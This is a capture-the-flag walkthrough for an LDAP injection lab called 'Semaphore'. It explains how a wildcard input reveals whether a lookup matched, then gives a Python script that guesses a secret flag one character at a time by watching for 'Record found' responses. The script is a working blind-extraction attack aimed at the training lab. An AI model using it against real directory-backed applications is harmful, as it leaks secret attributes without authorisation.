# Semaphore

### Lab Link
[WebVerse - Semaphore](https://dashboard.webverselabs-pro.com/academy/ldap-injection/practice/challenge/semaphore?back=%2Facademy%2Fldap-injection%3Ftab%3Doverview)

---

### Skill & Knowledge
- LDAP - Wildcards and blind attribute theft

---

In this LDAP challenge, we can see there is only one input to test our injection, so we go straight to check how the webpage responds. We try the example given `okafor`; since it is correct, it shows `Record Found`. 

Now try to remove the letter `r` on the end, and it shows `No Record Found`. Since we now have an idea on LDAP, let's try to use `* wildcard`; and it says `Record Found`.

To make the logic short, we need to feed it letters, numbers, and special characters one at a time and watch the response.

```
webverse{*
```

For a simple approach using payload(letters, numbers, and special characters) in Caido(Automate) and Burpsuite(Sniper) is the simplest one , but will take longer as every response need to be check if it says `Record Found` or `No Record Found` since it can't be identified by checking the Status, Length, or Round-Trip Time.

---

#### Using Script

Once you understand the logic, you could use this Script using python3 to capture the flag faster and save time.

> *Note: change url and Cookie according on your web request*

```
import string
import requests

url = "https://6a007dca-5187-semaphore-7a16c.challenges.webverselabs-pro.com/"

headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101"
        " Firefox/140.0"
    ),
    "Cookie": (
        "cf_clearance=nGZehG0uWyJGrpghKMeao548ToQDc2p8l4iBQ2bp1As-1786963601-1.2.1.1-tJKd_88Qlf7pa0U01Atmbevv81RY89W1yFMnpLy.BnWlxpJwhC.us2gJV3zMSPaX_lw7WHCfCvudqedE8FfdoK._HY1zImaDUWPmvU0Cc6.JUO5y3f2Cp5uaY889rJGmTlXMANYmSw3Bb4OQ3MsIzfrikr.yL.Uf0KMRrW.RN1XgGA4HwpES4XvHg5b7rEHWDDPn9mZAzl9OUG0Wsum3fTdOQka9fx7X7dvGudWr81mdAWLf54KLxmQsR7r9fRy0_CpTf4cGPh9dh08_MCYTwOym_N463YkNpa0xvWHP1njDXGlHUEmLv7okIb_19EYSH.YwjO5qZ5HIVAqQjKrxWQQu2GH7VWhV0YMVxw1Qdqs"
    ),
    "Content-Type": "application/x-www-form-urlencoded",
}

charset = string.ascii_letters + string.digits + "_{}-"
prefix = "webverse{"

while True:
  found = False
  for c in charset:
    # Correctly appends character AND the wildcard * at the end
    payload_value = f"{prefix}{c}*"
    data = {"uid": payload_value}

    r = requests.post(url, headers=headers, data=data)

    # Checks for the positive success message ("Record found")
    if "Record found" in r.text:
      prefix += c
      print(prefix)
      found = True
      break

  if not found:
    print("Extraction complete or interrupted.")
    break

```

